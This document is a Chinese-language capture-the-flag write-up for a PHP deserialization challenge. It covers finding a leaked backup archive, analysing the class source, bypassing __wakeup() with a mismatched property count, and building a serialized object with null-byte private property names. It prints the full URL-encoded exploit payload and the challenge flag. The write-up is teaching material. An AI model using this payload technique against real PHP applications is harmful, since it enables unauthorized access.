# [极客大挑战 2019]PHP

## 题目来源

[极客大挑战 2019]PHP

## 题目方向 + 知识点

PHP 反序列化、魔术方法利用、`__wakeup()` 绕过、`__destruct()` 触发、私有属性序列化格式、备份文件泄露。

## 解题思路

这题我打开首页之后，先没有急着盯着页面本身找输入框，因为首页给了一句非常刻意的提示：“因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯。” 这种话在 CTF 里一般不会是单纯的装饰，往往是在提醒做题人去找备份文件。

所以我第一步就是尝试常见备份文件名。很快访问 `/www.zip` 成功下载到了站点源码。这个步骤非常关键，因为后面的利用几乎完全依赖源码分析。

源码解压后，主要看到三个关键文件：`index.php`、`class.php` 和 `flag.php`。

先看 `index.php`：

```php
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
```

这里逻辑非常直接：程序把 GET 参数 `select` 取出来，随后直接送进 `unserialize()`。这就意味着用户可以完全控制反序列化内容，所以题目的核心漏洞已经很明确了，就是 PHP 反序列化。

接着分析 `class.php`：

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>
```

这段代码我重点看的是两个魔术方法：`__wakeup()` 和 `__destruct()`。

先看 `__destruct()`，拿 flag 的条件其实很清晰：

1. `$password != 100` 这个条件必须为假，也就是 `$password` 要等于 `100`；
2. `$username === 'admin'` 必须成立。

如果同时满足这两个条件，就会执行：

```php
global $flag;
echo $flag;
```

也就是说，理论上我们只要构造一个对象，让它在销毁时满足：

```php
$username = 'admin'
$password = 100
```

就可以直接拿到 flag。

但是问题马上就出现了：`__wakeup()` 会在反序列化时自动执行，并且它会强制把：

```php
$this->username = 'guest';
```

这就意味着，哪怕我在序列化字符串里写入了 `admin`，只要 `__wakeup()` 正常执行，最后用户名都会被改成 `guest`，从而无法通过 `__destruct()` 的判断。

所以这题真正要解决的问题不是“怎么传 admin”，而是：怎么让 `__wakeup()` 不生效。

这里用到的是 PHP 里的一个经典老特性：在较老版本环境中，如果反序列化对象时，对象头部声明的属性个数和真实属性个数不一致，就可能导致 `__wakeup()` 被绕过。

这个 `Name` 类真实只有两个属性：

- `username`
- `password`

也就是说，正常序列化时对象头应该是：

```php
O:4:"Name":2:{...}
```

但如果把这个 `2` 改成 `3`，就有机会让 `__wakeup()` 不正常执行。这样一来，我写进去的 `username=admin` 就能保留下来。

接下来还有一个细节必须注意：这两个成员变量都是 private 私有属性。PHP 在序列化私有属性时，属性名不是直接写 `username` 或 `password`，而是要写成下面这种格式：

```php
\0类名\0属性名
```

因此本题真正需要使用的属性名是：

```php
\0Name\0username
\0Name\0password
```

于是我就可以构造出最终的对象：

```php
O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
```

这里逐段解释一下：

- `O:4:"Name"` 表示这是一个 `Name` 类对象；
- `:3:` 表示我故意把属性数量写成 `3`，用来绕过 `__wakeup()`；
- `s:14:"\0Name\0username";s:5:"admin";` 表示把私有属性 `username` 赋值为 `admin`；
- `s:14:"\0Name\0password";i:100;` 表示把私有属性 `password` 赋值为整数 `100`。

需要特别注意的一点是：这里的 `\0` 在真正发包时必须是实际的空字节，不能只是肉眼看到的两个字符“反斜杠+0”。也就是说，实战里一般需要借助脚本或抓包工具，把真正的空字节编码进去，再 URL 编码发送。

最终可用的 payload 为：

```text
/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

我把这条 payload 发过去之后，页面成功回显 flag，说明整个利用链条已经打通。

为了更清楚地总结整题的利用逻辑，可以把过程整理成下面这条链：

1. 首页提示存在备份习惯，于是尝试访问备份文件；
2. 成功下载 `/www.zip`，拿到源码；
3. 在 `index.php` 中发现 `unserialize($_GET['select'])`；
4. 在 `class.php` 中发现 `__destruct()` 是最终利用点；
5. 明确取 flag 条件是 `password == 100` 且 `username === 'admin'`；
6. 发现 `__wakeup()` 会把 `username` 改成 `guest`；
7. 使用属性数量不匹配的方式绕过 `__wakeup()`；
8. 构造私有属性的序列化字符串，最终成功输出 flag。

这题本质上是一个非常典型的入门级 PHP 反序列化题，难点不在复杂链子，而在两个基础点是否熟悉：

- 是否能想到先找备份文件；
- 是否知道老版本 PHP 可以通过“属性个数不匹配”绕过 `__wakeup()`。

如果直接把对象属性个数老老实实写成 `2`，那么 `__wakeup()` 会正常执行，`username` 会被改成 `guest`，最后不可能走到输出 flag 的分支。所以这题最关键的一步，其实就是把这个 `2` 改成 `3`。

## Flag

`CTF2{7c93dad4-f2c7-4dfb-9f81-16881f1b8a3d}`